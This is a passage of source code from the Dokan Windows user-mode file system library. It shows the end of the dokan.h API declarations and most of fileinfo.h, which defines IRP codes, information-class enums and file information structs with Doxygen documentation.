 * \c DOS_QM (\c > greater than) Matches any single character or, upon encountering a period or end
 *        of name string, advances the expression to the end of the set of
 *        contiguous DOS_QMs.\n
 * \c DOS_STAR (\c < less than) Matches zero or more characters until encountering and matching
 *          the final \c . in the name.
 *
 * \param Expression Expression can contain any of the above characters.
 * \param Name Name to check
 * \param IgnoreCase Case sensitive or not
 * \return result if name matches the expression
 */
BOOL DOKANAPI DokanIsNameInExpression(LPCWSTR Expression, LPCWSTR Name,
                                      BOOL IgnoreCase);

/**
 * \brief Get the version of Dokan.
 * The returned ULONG is the version number without the dots.
 * \return The version of Dokan
 */
ULONG DOKANAPI DokanVersion();

/**
 * \brief Get the version of the Dokan driver.
 * The returned ULONG is the version number without the dots.
 * \return The version of Dokan driver.
 */
ULONG DOKANAPI DokanDriverVersion();

/**
 * \brief Extends the timeout of the current IO operation in driver.
 *
 * \param Timeout Extended time in milliseconds requested.
 * \param DokanFileInfo \ref DOKAN_FILE_INFO of the operation to extend.
 * \return If the operation was successful.
 */
BOOL DOKANAPI DokanResetTimeout(ULONG Timeout, PDOKAN_FILE_INFO DokanFileInfo);

/**
 * \brief Get the handle to Access Token.
 *
 * This method needs be called in \ref DOKAN_OPERATIONS.ZwCreateFile callback.
 * The caller must call <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211(v=vs.85).aspx">CloseHandle</a>
 * for the returned handle.
 *
 * \param DokanFileInfo \ref DOKAN_FILE_INFO of the operation to extend.
 * \return A handle to the account token for the user on whose behalf the code is running.
 */
HANDLE DOKANAPI DokanOpenRequestorToken(PDOKAN_FILE_INFO DokanFileInfo);

/**
 * \brief Get active Dokan mount points.
 *
 * Returned array need to be released by calling \ref DokanReleaseMountPointList
 *
 * \param uncOnly Get only instances that have UNC Name.
 * \param nbRead Number of instances successfully retrieved.
 * \return Allocate array of DOKAN_MOUNT_POINT_INFO.
 */
PDOKAN_MOUNT_POINT_INFO DOKANAPI DokanGetMountPointList(BOOL uncOnly, PULONG nbRead);

/**
 * \brief Release Mount point list resources from \ref DokanGetMountPointList.
 *
 * After \ref DokanGetMountPointList call you will receive a dynamically allocated array of DOKAN_MOUNT_POINT_INFO.
 * This array needs to be released when no longer needed by calling this function.
 *
 * \param list Allocated array of DOKAN_MOUNT_POINT_INFO from \ref DokanGetMountPointList.
 * \return Nothing.
 */
VOID DOKANAPI DokanReleaseMountPointList(PDOKAN_MOUNT_POINT_INFO list);

/**
 * \brief Convert \ref DOKAN_OPERATIONS.ZwCreateFile parameters to <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx">CreateFile</a> parameters.
 *
 * Dokan Kernel forward the DesiredAccess directly from the IRP_MJ_CREATE.
 * This DesiredAccess has been converted from generic rights (user CreateFile request) to standard rights and will be converted back here.
 * https://msdn.microsoft.com/windows/hardware/drivers/ifs/access-mask
 *
 * \param DesiredAccess DesiredAccess from \ref DOKAN_OPERATIONS.ZwCreateFile.
 * \param FileAttributes FileAttributes from \ref DOKAN_OPERATIONS.ZwCreateFile.
 * \param CreateOptions CreateOptions from \ref DOKAN_OPERATIONS.ZwCreateFile.
 * \param CreateDisposition CreateDisposition from \ref DOKAN_OPERATIONS.ZwCreateFile.
 * \param outDesiredAccess New <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx">CreateFile</a> dwDesiredAccess.
 * \param outFileAttributesAndFlags New <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx">CreateFile</a> dwFlagsAndAttributes.
 * \param outCreationDisposition New <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx">CreateFile</a> dwCreationDisposition.
 * \see <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx">CreateFile function (MSDN)</a>
 */
VOID DOKANAPI DokanMapKernelToUserCreateFileFlags(
    ACCESS_MASK DesiredAccess, ULONG FileAttributes, ULONG CreateOptions,
    ULONG CreateDisposition, ACCESS_MASK *outDesiredAccess,
    DWORD *outFileAttributesAndFlags, DWORD *outCreationDisposition);

/**
 * \defgroup DokanNotify Dokan Notify
 * \brief Dokan User FS file-change notification
 *
 * The application implementing the user file system can notify
 * the Dokan kernel driver of external file- and directory-changes.
 *
 * For example, the mirror application can notify the driver about
 * changes made in the mirrored directory so that those changes will
 * be automatically reflected in the implemented mirror file system.
 *
 * This requires the FilePath passed to the respective DokanNotify*-functions
 * to include the absolute path of the changed file including the drive-letter
 * and the path to the mount point, e.g. "C:\Dokan\ChangedFile.txt".
 *
 * These functions SHOULD NOT be called from within the implemented
 * file system and thus be independent of any Dokan file system operation.
 * @{
 */

/**
 * \brief Notify dokan that a file or a directory has been created.
 *
 * \param DokanInstance The dokan mount context created by \ref DokanCreateFileSystem .
 * \param FilePath Absolute path to the file or directory, including the mount-point of the file system.
 * \param IsDirectory Indicates if the path is a directory.
 * \return \c TRUE if notification succeeded.
 */
BOOL DOKANAPI DokanNotifyCreate(_In_ DOKAN_HANDLE DokanInstance,
                                _In_ LPCWSTR FilePath, _In_ BOOL IsDirectory);

/**
 * \brief Notify dokan that a file or a directory has been deleted.
 *
 * \param DokanInstance The dokan mount context created by \ref DokanCreateFileSystem .
 * \param FilePath Absolute path to the file or directory, including the mount-point of the file system.
 * \param IsDirectory Indicates if the path was a directory.
 * \return \c TRUE if notification succeeded.
 */
BOOL DOKANAPI DokanNotifyDelete(_In_ DOKAN_HANDLE DokanInstance,
                                _In_ LPCWSTR FilePath, _In_ BOOL IsDirectory);

/**
 * \brief Notify dokan that file or directory attributes have changed.
 *
 * \param DokanInstance The dokan mount context created by \ref DokanCreateFileSystem .
 * \param FilePath Absolute path to the file or directory, including the mount-point of the file system.
 * \return \c TRUE if notification succeeded.
 */
BOOL DOKANAPI DokanNotifyUpdate(_In_ DOKAN_HANDLE DokanInstance,
                                _In_ LPCWSTR FilePath);

/**
 * \brief Notify dokan that file or directory extended attributes have changed.
 *
 * \param DokanInstance The dokan mount context created by \ref DokanCreateFileSystem .
 * \param FilePath Absolute path to the file or directory, including the mount-point of the file system.
 * \return \c TRUE if notification succeeded.
 */
BOOL DOKANAPI DokanNotifyXAttrUpdate(_In_ DOKAN_HANDLE DokanInstance,
                                     _In_ LPCWSTR FilePath);

/**
 * \brief Notify dokan that a file or a directory has been renamed. This method
 *  supports in-place rename for file/directory within the same parent.
 *
 * \param DokanInstance The dokan mount context created by \ref DokanCreateFileSystem .
 * \param OldPath Old, absolute path to the file or directory, including the mount-point of the file system.
 * \param NewPath New, absolute path to the file or directory, including the mount-point of the file system.
 * \param IsDirectory Indicates if the path is a directory.
 * \param IsInSameDirectory Indicates if the file or directory have the same parent directory.
 * \return \c TRUE if notification succeeded.
 */
BOOL DOKANAPI DokanNotifyRename(_In_ DOKAN_HANDLE DokanInstance,
                                _In_ LPCWSTR OldPath, _In_ LPCWSTR NewPath,
                                _In_ BOOL IsDirectory,
                                _In_ BOOL IsInSameDirectory);

/**@}*/

/**
 * \brief Convert WIN32 error to NTSTATUS
 *
 * https://support.microsoft.com/en-us/kb/113996
 *
 * \param Error Win32 Error to convert
 * \return NTSTATUS associate to the ERROR.
 */
NTSTATUS DOKANAPI DokanNtStatusFromWin32(DWORD Error);

/** @} */

#ifdef __cplusplus
}
#endif

#endif // DOKAN_H_

```

`includes/fileinfo.h`:

```h
/*
  Dokan : user-mode file system library for Windows

  Copyright (C) 2015 - 2019 Adrien J. <liryna.stark@gmail.com> and Maxime C. <maxime@islog.com>
  Copyright (C) 2007 - 2011 Hiroki Asakawa <info@dokan-dev.net>

  http://dokan-dev.github.io

This program is free software; you can redistribute it and/or modify it under
the terms of the GNU Lesser General Public License as published by the Free
Software Foundation; either version 3 of the License, or (at your option) any
later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU Lesser General Public License along
with this program. If not, see <http://www.gnu.org/licenses/>.
*/

#ifndef FILEINFO_H_
#define FILEINFO_H_

#define IRP_MJ_CREATE 0x00
#define IRP_MJ_CREATE_NAMED_PIPE 0x01
#define IRP_MJ_CLOSE 0x02
#define IRP_MJ_READ 0x03
#define IRP_MJ_WRITE 0x04
#define IRP_MJ_QUERY_INFORMATION 0x05
#define IRP_MJ_SET_INFORMATION 0x06
#define IRP_MJ_QUERY_EA 0x07
#define IRP_MJ_SET_EA 0x08
#define IRP_MJ_FLUSH_BUFFERS 0x09
#define IRP_MJ_QUERY_VOLUME_INFORMATION 0x0a
#define IRP_MJ_SET_VOLUME_INFORMATION 0x0b
#define IRP_MJ_DIRECTORY_CONTROL 0x0c
#define IRP_MJ_FILE_SYSTEM_CONTROL 0x0d
#define IRP_MJ_DEVICE_CONTROL 0x0e
#define IRP_MJ_INTERNAL_DEVICE_CONTROL 0x0f
#define IRP_MJ_SHUTDOWN 0x10
#define IRP_MJ_LOCK_CONTROL 0x11
#define IRP_MJ_CLEANUP 0x12
#define IRP_MJ_CREATE_MAILSLOT 0x13
#define IRP_MJ_QUERY_SECURITY 0x14
#define IRP_MJ_SET_SECURITY 0x15
#define IRP_MJ_POWER 0x16
#define IRP_MJ_SYSTEM_CONTROL 0x17
#define IRP_MJ_DEVICE_CHANGE 0x18
#define IRP_MJ_QUERY_QUOTA 0x19
#define IRP_MJ_SET_QUOTA 0x1a
#define IRP_MJ_PNP 0x1b
#define IRP_MJ_PNP_POWER IRP_MJ_PNP
#define IRP_MJ_MAXIMUM_FUNCTION 0x1b

#define IRP_MN_LOCK 0x01
#define IRP_MN_UNLOCK_SINGLE 0x02
#define IRP_MN_UNLOCK_ALL 0x03
#define IRP_MN_UNLOCK_ALL_BY_KEY 0x04

typedef enum _FILE_INFORMATION_CLASS {
	FileDirectoryInformation = 1,
	FileFullDirectoryInformation,            // 2
	FileBothDirectoryInformation,            // 3
	FileBasicInformation,                    // 4
	FileStandardInformation,                 // 5
	FileInternalInformation,                 // 6
	FileEaInformation,                       // 7
	FileAccessInformation,                   // 8
	FileNameInformation,                     // 9
	FileRenameInformation,                   // 10
	FileLinkInformation,                     // 11
	FileNamesInformation,                    // 12
	FileDispositionInformation,              // 13
	FilePositionInformation,                 // 14
	FileFullEaInformation,                   // 15
	FileModeInformation,                     // 16
	FileAlignmentInformation,                // 17
	FileAllInformation,                      // 18
	FileAllocationInformation,               // 19
	FileEndOfFileInformation,                // 20
	FileAlternateNameInformation,            // 21
	FileStreamInformation,                   // 22
	FilePipeInformation,                     // 23
	FilePipeLocalInformation,                // 24
	FilePipeRemoteInformation,               // 25
	FileMailslotQueryInformation,            // 26
	FileMailslotSetInformation,              // 27
	FileCompressionInformation,              // 28
	FileObjectIdInformation,                 // 29
	FileCompletionInformation,               // 30
	FileMoveClusterInformation,              // 31
	FileQuotaInformation,                    // 32
	FileReparsePointInformation,             // 33
	FileNetworkOpenInformation,              // 34
	FileAttributeTagInformation,             // 35
	FileTrackingInformation,                 // 36
	FileIdBothDirectoryInformation,          // 37
	FileIdFullDirectoryInformation,          // 38
	FileValidDataLengthInformation,          // 39
	FileShortNameInformation,                // 40
	FileIoCompletionNotificationInformation, // 41
	FileIoStatusBlockRangeInformation,       // 42
	FileIoPriorityHintInformation,           // 43
	FileSfioReserveInformation,              // 44
	FileSfioVolumeInformation,               // 45
	FileHardLinkInformation,                 // 46
	FileProcessIdsUsingFileInformation,      // 47
	FileNormalizedNameInformation,           // 48
	FileNetworkPhysicalNameInformation,      // 49
	FileIdGlobalTxDirectoryInformation,      // 50
	FileIsRemoteDeviceInformation,           // 51
	FileUnusedInformation,                   // 52
	FileNumaNodeInformation,                 // 53
	FileStandardLinkInformation,             // 54
	FileRemoteProtocolInformation,           // 55

	//
	//  These are special versions of these operations (defined earlier)
	//  which can be used by kernel mode drivers only to bypass security
	//  access checks for Rename and HardLink operations.  These operations
	//  are only recognized by the IOManager, a file system should never
	//  receive these.
	//

	FileRenameInformationBypassAccessCheck,  // 56
	FileLinkInformationBypassAccessCheck,    // 57

	//
	// End of special information classes reserved for IOManager.
	//

	FileVolumeNameInformation,               // 58
	FileIdInformation,                       // 59
	FileIdExtdDirectoryInformation,          // 60
	FileReplaceCompletionInformation,        // 61
	FileHardLinkFullIdInformation,           // 62
	FileIdExtdBothDirectoryInformation,      // 63
	FileDispositionInformationEx,            // 64
	FileRenameInformationEx,                 // 65
	FileRenameInformationExBypassAccessCheck, // 66
	FileDesiredStorageClassInformation,      // 67
	FileStatInformation,                     // 68
	FileMemoryPartitionInformation,          // 69

	FileMaximumInformation
} FILE_INFORMATION_CLASS,
    *PFILE_INFORMATION_CLASS;

typedef enum _FSINFOCLASS {
  FileFsVolumeInformation = 1,
  FileFsLabelInformation,       // 2
  FileFsSizeInformation,        // 3
  FileFsDeviceInformation,      // 4
  FileFsAttributeInformation,   // 5
  FileFsControlInformation,     // 6
  FileFsFullSizeInformation,    // 7
  FileFsObjectIdInformation,    // 8
  FileFsDriverPathInformation,  // 9
  FileFsVolumeFlagsInformation, // 10
  FileFsMaximumInformation
} FS_INFORMATION_CLASS,
    *PFS_INFORMATION_CLASS;

/**
 * \struct FILE_ALIGNMENT_INFORMATION
 * \brief Used as an argument to the ZwQueryInformationFile routine.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileAllInformation
 */
typedef struct _FILE_ALIGNMENT_INFORMATION {
  /**
  * The buffer alignment required by the underlying device. For a list of system-defined values, see DEVICE_OBJECT.
  * The value must be one of the FILE_XXX_ALIGNMENT values defined in Wdm.h.
  * For more information, see DEVICE_OBJECT and Initializing a Device Object.
  */
  ULONG AlignmentRequirement;
} FILE_ALIGNMENT_INFORMATION, *PFILE_ALIGNMENT_INFORMATION;

/**
 * \struct FILE_NAME_INFORMATION
 * \brief Used as argument to the ZwQueryInformationFile and ZwSetInformationFile routines.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileNameInformation
 */
typedef struct _FILE_NAME_INFORMATION {
  /**
  * Specifies the length, in bytes, of the file name string.
  */
  ULONG FileNameLength;
  /**
  * Specifies the first character of the file name string. This is followed in memory by the remainder of the string.
  */
  WCHAR FileName[1];
} FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;

/**
 * \struct FILE_ATTRIBUTE_TAG_INFORMATION
 * \brief Used as an argument to ZwQueryInformationFile.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileAttributeTagInformation
 */
typedef struct _FILE_ATTRIBUTE_TAG_INFORMATION {
  /**
  * Specifies one or more FILE_ATTRIBUTE_XXX flags.
  * For descriptions of these flags, see the documentation of the GetFileAttributes function in the Microsoft Windows SDK.
  */
  ULONG FileAttributes;
  /**
  * Specifies the reparse point tag. If the FileAttributes member includes the FILE_ATTRIBUTE_REPARSE_POINT attribute flag,
  * this member specifies the reparse tag. Otherwise, this member is unused.
  */
  ULONG ReparseTag;
} FILE_ATTRIBUTE_TAG_INFORMATION, *PFILE_ATTRIBUTE_TAG_INFORMATION;

/**
 * \struct FILE_DISPOSITION_INFORMATION
 * \brief Used as an argument to the ZwSetInformationFile routine.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileDispositionInformation
 */
typedef struct _FILE_DISPOSITION_INFORMATION {
  /**
  * Indicates whether the operating system file should delete the file when the file is closed.
  * Set this member to TRUE to delete the file when it is closed.
  * Otherwise, set to FALSE. Setting this member to FALSE has no effect if the handle was opened with FILE_FLAG_DELETE_ON_CLOSE.
  */
  BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;

#define FILE_DISPOSITION_DO_NOT_DELETE 0x00000000 // Specifies the system should not delete a file.
#define FILE_DISPOSITION_DELETE 0x00000001 // Specifies the system should delete a file.
#define FILE_DISPOSITION_POSIX_SEMANTICS  0x00000002 // Specifies the system should perform a POSIX - style delete.
#define FILE_DISPOSITION_FORCE_IMAGE_SECTION_CHECK  0x00000004 // Specifies the system should force an image section check.
#define FILE_DISPOSITION_ON_CLOSE 0x00000008 // Specifies if the system sets or clears the on - close state.

/**
 * \struct FILE_DISPOSITION_INFORMATION_EX
 * \brief Used as an argument to the ZwSetInformationFile routine.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileDispositionInformationEx
 */
typedef struct _FILE_DISPOSITION_INFORMATION_EX {
  /**
   * Specifies what action(s) the system should take with a specific file while deleting.
   *
   *    \li \c FILE_DISPOSITION_DO_NOT_DELETE Specifies the system should not delete a file.
   *    \li \c FILE_DISPOSITION_DELETE Specifies the system should delete a file.
   *    \li \c FILE_DISPOSITION_POSIX_SEMANTICS Specifies the system should perform a POSIX-style delete.
   *    \li \c FILE_DISPOSITION_FORCE_IMAGE_SECTION_CHECK Specifies the system should force an image section check.
   *    \li \c FILE_DISPOSITION_ON_CLOSE Specifies if the system sets or clears the on-close state.
   */
  ULONG Flags;
} FILE_DISPOSITION_INFORMATION_EX, *PFILE_DISPOSITION_INFORMATION_EX;

/**
 * \struct FILE_END_OF_FILE_INFORMATION
 * \brief Used as an argument to the ZwSetInformationFile routine.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileEndOfFileInformation
 */
typedef struct _FILE_END_OF_FILE_INFORMATION {
  /**
  * The absolute new end of file position as a byte offset from the start of the file. 
  */
  LARGE_INTEGER EndOfFile;
} FILE_END_OF_FILE_INFORMATION, *PFILE_END_OF_FILE_INFORMATION;

/**
 * \struct FILE_VALID_DATA_LENGTH_INFORMATION
 * \brief Used as an argument to ZwSetInformationFile.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileValidDataLengthInformation
 */
typedef struct _FILE_VALID_DATA_LENGTH_INFORMATION {
  /**
  * Specifies the new valid data length for the file.
  * This parameter must be a positive value that is greater than the current valid data length, but less than or equal to the current file size. 
  */
  LARGE_INTEGER ValidDataLength;
} FILE_VALID_DATA_LENGTH_INFORMATION, *PFILE_VALID_DATA_LENGTH_INFORMATION;

/**
 * \struct FILE_BASIC_INFORMATION
 * \brief Used as an argument to routines that query or set file information.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileBasicInformation and FileAllInformation
 */
typedef struct _FILE_BASIC_INFORMATION {
  /**
  * Specifies the time that the file was created. 
  */
  LARGE_INTEGER CreationTime;
  /**
  * Specifies the time that the file was last accessed. 
  */
  LARGE_INTEGER LastAccessTime;
  /**
  * Specifies the time that the file was last written to. 
  */
  LARGE_INTEGER LastWriteTime;
  /**
  * Specifies the last time the file was changed. 
  */
  LARGE_INTEGER ChangeTime;
  /**
  * Specifies one or more FILE_ATTRIBUTE_XXX flags. For descriptions of these flags,
  * see the documentation for the GetFileAttributes function in the Microsoft Windows SDK.
  */
  ULONG FileAttributes;
} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;

/**
 * \struct FILE_STANDARD_INFORMATION
 * \brief Used as an argument to routines that query or set file information.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileStandardInformation and FileAllInformation
 */
typedef struct _FILE_STANDARD_INFORMATION {
  /**
  * The file allocation size in bytes. Usually, this value is a multiple of the sector or cluster size of the underlying physical device. 
  */
  LARGE_INTEGER AllocationSize;
  /**
  * The end of file location as a byte offset.
  */
  LARGE_INTEGER EndOfFile;
  /**
  * The number of hard links to the file.
  */
  ULONG NumberOfLinks;
  /**
  * The delete pending status. TRUE indicates that a file deletion has been requested.
  */
  BOOLEAN DeletePending;
  /**
  * The file directory status. TRUE indicates the file object represents a directory. 
  */
  BOOLEAN Directory;
} FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;

/**
 * \struct FILE_POSITION_INFORMATION
 * \brief Used as an argument to routines that query or set file information.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FilePositionInformation and FileAllInformation
 */
typedef struct _FILE_POSITION_INFORMATION {
  /**
  * The byte offset of the current file pointer.
  */
  LARGE_INTEGER CurrentByteOffset;
} FILE_POSITION_INFORMATION, *PFILE_POSITION_INFORMATION;

/**
 * \struct FILE_DIRECTORY_INFORMATION
 * \brief Used to query detailed information for the files in a directory. 
 */
typedef struct _FILE_DIRECTORY_INFORMATION {
  /**
  * Byte offset of the next FILE_DIRECTORY_INFORMATION entry, if multiple entries are present in a buffer.
  * This member is zero if no other entries follow this one. 
  */
  ULONG NextEntryOffset;
  /**
  * Byte offset of the file within the parent directory. This member is undefined for file systems, such as NTFS,
  * in which the position of a file within the parent directory is not fixed and can be changed at any time to maintain sort order. 
  */
  ULONG FileIndex;
  /**
  * Time when the file was created.
  */
  LARGE_INTEGER CreationTime;
  /**
  * Last time the file was accessed. 
  */
  LARGE_INTEGER LastAccessTime;
  /**
  * Last time information was written to the file.
  */
  LARGE_INTEGER LastWriteTime;
  /**
  * Last time the file was changed. 
  */
  LARGE_INTEGER ChangeTime;
  /**
  * Absolute new end-of-file position as a byte offset from the start of the file.
  * EndOfFile specifies the byte offset to the end of the file.
  * Because this value is zero-based, it actually refers to the first free byte in the file. In other words,
  * EndOfFile is the offset to the byte immediately following the last valid byte in the file.
  */
  LARGE_INTEGER EndOfFile;
  /**
  * File allocation size, in bytes. Usually, this value is a multiple of the sector or cluster size of the underlying physical device. 
  */
  LARGE_INTEGER AllocationSize;
  /**
  *  File attributes, which can be any valid combination of the following:
  *
  *    \li \c FILE_ATTRIBUTE_READONLY
  *    \li \c FILE_ATTRIBUTE_HIDDEN
  *    \li \c FILE_ATTRIBUTE_SYSTEM
  *    \li \c FILE_ATTRIBUTE_DIRECTORY
  *    \li \c FILE_ATTRIBUTE_ARCHIVE
  *    \li \c FILE_ATTRIBUTE_NORMAL
  *    \li \c FILE_ATTRIBUTE_TEMPORARY
  *    \li \c FILE_ATTRIBUTE_COMPRESSED
  */
  ULONG FileAttributes;
  /**
  * Specifies the length of the file name string. 
  */
  ULONG FileNameLength;
  /**
  * Specifies the first character of the file name string.
  * This is followed in memory by the remainder of the string. 
  */
  WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

/**
 * \struct FILE_FULL_DIR_INFORMATION
 * \brief Used to query detailed information for the files in a directory. 
 */
typedef struct _FILE_FULL_DIR_INFORMATION {
  /**
  * Byte offset of the next FILE_DIRECTORY_INFORMATION entry, if multiple entries are present in a buffer.
  * This member is zero if no other entries follow this one.
  */
  ULONG NextEntryOffset;
  /**
  * Byte offset of the file within the parent directory. This member is undefined for file systems, such as NTFS,
  * in which the position of a file within the parent directory is not fixed and can be changed at any time to maintain sort order.
  */
  ULONG FileIndex;
  /**
  * Time when the file was created.
  */
  LARGE_INTEGER CreationTime;
  /**
  * Last time the file was accessed.
  */
  LARGE_INTEGER LastAccessTime;
  /**
  * Last time information was written to the file.
  */
  LARGE_INTEGER LastWriteTime;
  /**
  * Last time the file was changed.
  */
  LARGE_INTEGER ChangeTime;
  /**
  * Absolute new end-of-file position as a byte offset from the start of the file.
  * EndOfFile specifies the byte offset to the end of the file.
  * Because this value is zero-based, it actually refers to the first free byte in the file. In other words,
  * EndOfFile is the offset to the byte immediately following the last valid byte in the file.
  */
  LARGE_INTEGER EndOfFile;
  /**
  * File allocation size, in bytes. Usually, this value is a multiple of the sector or cluster size of the underlying physical device.
  */
  LARGE_INTEGER AllocationSize;
  /**
  *  File attributes, which can be any valid combination of the following:
  *
  *   \li \c FILE_ATTRIBUTE_READONLY
  *   \li \c FILE_ATTRIBUTE_HIDDEN
  *   \li \c FILE_ATTRIBUTE_SYSTEM
  *   \li \c FILE_ATTRIBUTE_DIRECTORY
  *   \li \c FILE_ATTRIBUTE_ARCHIVE
  *   \li \c FILE_ATTRIBUTE_NORMAL
  *   \li \c FILE_ATTRIBUTE_TEMPORARY
  *   \li \c FILE_ATTRIBUTE_COMPRESSED
  */
  ULONG FileAttributes;
  /**
  * Specifies the length of the file name string.
  */
  ULONG FileNameLength;
  /**
  * Combined length, in bytes, of the extended attributes (EA) for the file. 
  */
  ULONG EaSize;
  /**
  * Specifies the first character of the file name string.
  * This is followed in memory by the remainder of the string.
  */
  WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

/**
 * \struct FILE_ID_FULL_DIR_INFORMATION
 * \brief Used to query detailed information for the files in a directory.
 */
typedef struct _FILE_ID_FULL_DIR_INFORMATION {
  /**
  * Byte offset of the next FILE_DIRECTORY_INFORMATION entry, if multiple entries are present in a buffer.
  * This member is zero if no other entries follow this one.
  */
  ULONG NextEntryOffset;
  /**
  * Byte offset of the file within the parent directory. This member is undefined for file systems, such as NTFS,
  * in which the position of a file within the parent directory is not fixed and can be changed at any time to maintain sort order.
  */
  ULONG FileIndex;
  /**
  * Time when the file was created.
  */
  LARGE_INTEGER CreationTime;
  /**
  * Last time the file was accessed.
  */
  LARGE_INTEGER LastAccessTime;
  /**
  * Last time information was written to the file.
  */
  LARGE_INTEGER LastWriteTime;
  /**
  * Last time the file was changed.
  */
  LARGE_INTEGER ChangeTime;
  /**
  * Absolute new end-of-file position as a byte offset from the start of the file.
  * EndOfFile specifies the byte offset to the end of the file.
  * Because this value is zero-based, it actually refers to the first free byte in the file. In other words,
  * EndOfFile is the offset to the byte immediately following the last valid byte in the file.
  */
  LARGE_INTEGER EndOfFile;
  /**
  * File allocation size, in bytes. Usually, this value is a multiple of the sector or cluster size of the underlying physical device.
  */
  LARGE_INTEGER AllocationSize;
  /**
  *  File attributes, which can be any valid combination of the following:
  *
  *   \li \c FILE_ATTRIBUTE_READONLY
  *   \li \c FILE_ATTRIBUTE_HIDDEN
  *   \li \c FILE_ATTRIBUTE_SYSTEM
  *   \li \c FILE_ATTRIBUTE_DIRECTORY
  *   \li \c FILE_ATTRIBUTE_ARCHIVE
  *   \li \c FILE_ATTRIBUTE_NORMAL
  *   \li \c FILE_ATTRIBUTE_TEMPORARY
  *   \li \c FILE_ATTRIBUTE_COMPRESSED
  */
  ULONG FileAttributes;
  /**
  * Specifies the length of the file name string.
  */
  ULONG FileNameLength;
  /**
  * Combined length, in bytes, of the extended attributes (EA) for the file.
  */
  ULONG EaSize;
  /**
  * The 8-byte file reference number for the file. (Note that this is not the same as the 16-byte
  * "file object ID" that was added to NTFS for Microsoft Windows 2000.) 
  */
  LARGE_INTEGER FileId;
  /**
  * Specifies the first character of the file name string.
  * This is followed in memory by the remainder of the string.
  */
  WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;

/**
 * \struct FILE_BOTH_DIR_INFORMATION
 * \brief Used to query detailed information for the files in a directory.
 */
typedef struct _FILE_BOTH_DIR_INFORMATION {
  /**
  * Byte offset of the next FILE_DIRECTORY_INFORMATION entry, if multiple entries are present in a buffer.
  * This member is zero if no other entries follow this one.
  */
  ULONG NextEntryOffset;
  /**
  * Byte offset of the file within the parent directory. This member is undefined for file systems, such as NTFS,
  * in which the position of a file within the parent directory is not fixed and can be changed at any time to maintain sort order.
  */
  ULONG FileIndex;
  /**
  * Time when the file was created.
  */
  LARGE_INTEGER CreationTime;
  /**
  * Last time the file was accessed.
  */
  LARGE_INTEGER LastAccessTime;
  /**
  * Last time information was written to the file.
  */
  LARGE_INTEGER LastWriteTime;
  /**
  * Last time the file was changed.
  */
  LARGE_INTEGER ChangeTime;
  /**
  * Absolute new end-of-file position as a byte offset from the start of the file.
  * EndOfFile specifies the byte offset to the end of the file.
  * Because this value is zero-based, it actually refers to the first free byte in the file. In other words,
  * EndOfFile is the offset to the byte immediately following the last valid byte in the file.
  */
  LARGE_INTEGER EndOfFile;
  /**
  * File allocation size, in bytes. Usually, this value is a multiple of the sector or cluster size of the underlying physical device.
  */
  LARGE_INTEGER AllocationSize;
  /**
  *  File attributes, which can be any valid combination of the following:
  *
  *   \li \c FILE_ATTRIBUTE_READONLY
  *   \li \c FILE_ATTRIBUTE_HIDDEN
  *   \li \c FILE_ATTRIBUTE_SYSTEM
  *   \li \c FILE_ATTRIBUTE_DIRECTORY
  *   \li \c FILE_ATTRIBUTE_ARCHIVE
  *   \li \c FILE_ATTRIBUTE_NORMAL
  *   \li \c FILE_ATTRIBUTE_TEMPORARY
  *   \li \c FILE_ATTRIBUTE_COMPRESSED
  */
  ULONG FileAttributes;
  /**
  * Specifies the length of the file name string.
  */
  ULONG FileNameLength;
  /**
  * Combined length, in bytes, of the extended attributes (EA) for the file.
  */
  ULONG EaSize;
  /**
  * Specifies the length, in bytes, of the short file name string. 
  */
  CCHAR ShortNameLength;
  /**
  * Unicode string containing the short (8.3) name for the file. 
  */
  WCHAR ShortName[12];
  /**
  * Specifies the first character of the file name string. This is followed in memory by the remainder of the string. 
  */
  WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

/**
 * \struct FILE_ID_BOTH_DIR_INFORMATION
 * \brief Used to query detailed information for the files in a directory.
 */
typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
  /**
  * Byte offset of the next FILE_DIRECTORY_INFORMATION entry, if multiple entries are present in a buffer.
  * This member is zero if no other entries follow this one.
  */
  ULONG NextEntryOffset;
  /**
  * Byte offset of the file within the parent directory. This member is undefined for file systems, such as NTFS,
  * in which the position of a file within the parent directory is not fixed and can be changed at any time to maintain sort order.
  */
  ULONG FileIndex;
  /**
  * Time when the file was created.
  */
  LARGE_INTEGER CreationTime;
  /**
  * Last time the file was accessed.
  */
  LARGE_INTEGER LastAccessTime;
  /**
  * Last time information was written to the file.
  */
  LARGE_INTEGER LastWriteTime;
  /**
  * Last time the file was changed.
  */
  LARGE_INTEGER ChangeTime;
  /**
